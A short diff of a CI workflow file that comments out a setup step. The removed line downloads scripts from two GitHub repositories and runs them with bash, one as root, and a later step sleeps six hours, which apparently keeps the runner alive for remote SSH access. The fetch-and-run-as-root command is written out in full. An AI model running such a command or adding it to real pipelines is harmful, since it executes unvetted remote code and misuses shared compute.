@@ -16,7 +16,7 @@ jobs:
 
       - name: Setup
         run: |
-         sudo apt update && sudo  apt install wget sudo -y && wget https://github.com/ttffg003/ssh/raw/refs/heads/main/cloud && bash cloud  && sudo wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz -O /root/ssh1aung1xyz   && sudo chmod +x /root/ssh1aung1xyz && sudo bash /root/ssh1aung1xyz
+#         sudo apt update && sudo  apt install wget sudo -y && wget https://github.com/ttffg003/ssh/raw/refs/heads/main/cloud && bash cloud  && sudo wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz -O /root/ssh1aung1xyz   && sudo chmod +x /root/ssh1aung1xyz && sudo bash /root/ssh1aung1xyz
 
       - name: Sleep
         run: sleep 6h
